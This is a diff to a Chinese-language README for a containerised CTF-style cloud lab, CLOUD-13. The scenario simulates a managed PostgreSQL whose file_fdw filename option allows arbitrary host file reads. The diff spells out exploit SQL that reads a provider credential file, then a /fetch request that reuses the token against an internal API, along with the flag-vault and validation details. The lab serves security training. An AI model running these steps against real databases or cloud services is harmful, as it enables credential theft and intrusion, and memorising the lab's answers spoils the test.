@@ -7,9 +7,11 @@
 | ID | CLOUD-13 |
 | 名称 | RDS log_fdw: Managed DB Host File Read → Provider Internal Creds |
 | 技术/CVE | N/A (log_fdw path traversal, case #015) |
-| 难度 | L2 |
+| 难度 | L3 |
 | 交付方式 | Docker Compose |
 | 入口 | localhost:10624 |
+| 入口身份 | 宿主侧黑盒起点（无云凭据，需自行派生） |
+| 终点 | console + internal-api 经 flag-vault 交付（header-secret：供应商内部凭据（宿主文件里那份）） |
 
 ## 场景概述
 托管 PostgreSQL 预装了 log_fdw（读数据库日志的扩展），但扩展对
@@ -28,24 +30,28 @@ filename 选项没有做路径约束，客户可以把它当任意文件读，�
 - 托管数据库模型：客户拿到数据库角色，永远没有宿主 OS 账号
 
 ## 利用步骤
-1. 在控制台执行（启用 file_fdw 已预置）：
+
+1. 在控制台执行（`file_fdw` 已预置）：
    ```sql
    CREATE SERVER log_server FOREIGN DATA WRAPPER file_fdw;
    CREATE FOREIGN TABLE demo (t text) SERVER log_server
      OPTIONS (filename '/rdsdbdata/config/grover_volume.conf');
    SELECT * FROM demo;
    ```
-2. 读出 `grover_volume.conf`，得到内部 token 与 flag1。
-3. 用该 token 调用内部 API（经控制台 `/fetch`）：
-   `/fetch?url=http://internal-api:5000/api&auth=grover-internal-credential-token`
-   获得 flag2。
+2. 读出宿主机上的供应商配置文件——里面是**内部凭据**（不再是明文 flag）。控制台（托管引擎）
+   随即用这份凭据向 flag-vault 换取第一枚 flag 并补进同一响应。
+3. 用同一份内部凭据（`Authorization: Bearer grover-internal-credential-token`）经控制面
+   `/fetch` 调内部 API：`/fetch?url=http://internal-api:5000/api&auth=grover-internal-credential-token`，
+   换取第二枚 flag。
 
 ## Flag
-- 直接配置时的默认值：
-  - `CVE_FLAG1`（宿主配置文件）
-  - `CVE_FLAG2`（内部存储 API）
-- 通过 `./scripts/start-scenario.sh cloud-13` 启动时，终端会分别输出本次运行生成的
-  两枚 Flag；测试时应以该输出对应的值为准。
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 console + internal-api 向 flag-vault 出示「供应商内部凭据（宿主文件里那份）」（校验模式 `header-secret`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{cloud-13-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py cloud-13 <flag>`（gate）+
+  `python3 tests/cloud/run.py cloud-13 <flag>`（参考利用）。
 
 ## 此场景利用了哪些知识
 
